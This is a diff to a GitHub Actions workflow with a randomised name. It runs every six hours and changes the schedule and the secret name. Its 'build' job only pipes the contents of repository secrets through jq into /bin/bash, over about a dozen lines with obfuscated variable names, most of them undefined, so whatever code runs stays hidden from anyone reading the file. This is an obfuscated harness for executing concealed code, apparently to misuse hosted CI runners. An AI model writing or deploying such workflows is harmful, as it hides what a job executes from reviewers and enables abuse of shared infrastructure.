@@ -1,9 +1,8 @@
 name: wuhaoning3214
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 5/6 * * *'
+    - cron: '2 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,19 +10,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: wuhaoning3214
         env:
-          ng4: ${{ secrets.ng4 }}
+          oaxm281: ${{ secrets.oaxm281 }}
         run: |
-          echo $ng4 | jq -r .kfki795 | /bin/bash
-          echo $pq12311 | jq -r .zqbst413 | /bin/bash
-          echo $clq7 | jq -r .al3 | /bin/bash
-          echo $vipt4325 | jq -r .qdvz873 | /bin/bash
-          echo $zv81 | jq -r .bn620 | /bin/bash
-          echo $jx3 | jq -r .f91 | /bin/bash
-          echo $k571 | jq -r .vrt8 | /bin/bash
-          echo $m42637 | jq -r .x8501 | /bin/bash
-          echo $cx19 | jq -r .n7748 | /bin/bash
-          echo $krc50165 | jq -r .f9 | /bin/bash
-          echo $cdrdi2329 | jq -r .bt2 | /bin/bash
-          echo $r865 | jq -r .fxn6379 | /bin/bash
-          echo $ajjwg6162 | jq -r .zrdl626 | /bin/bash
+          echo $oaxm281 | jq -r .zkpmq433 | /bin/bash
+          echo $pg6 | jq -r .pfxky92884 | /bin/bash
+          echo $khgpq23990 | jq -r .okak1555 | /bin/bash
+          echo $dbdlk061 | jq -r .kie31 | /bin/bash
+          echo $uorl768 | jq -r .u12 | /bin/bash
+          echo $xu2 | jq -r .hrj4340 | /bin/bash
+          echo $aiwhu814 | jq -r .d2717 | /bin/bash
+          echo $oh17039 | jq -r .sf68484 | /bin/bash
+          echo $l39979 | jq -r .r8451 | /bin/bash
+          echo $ys29501 | jq -r .ndkr43142 | /bin/bash
+          echo $uf6997 | jq -r .nvw94970 | /bin/bash
+          echo $j8 | jq -r .m2 | /bin/bash
 
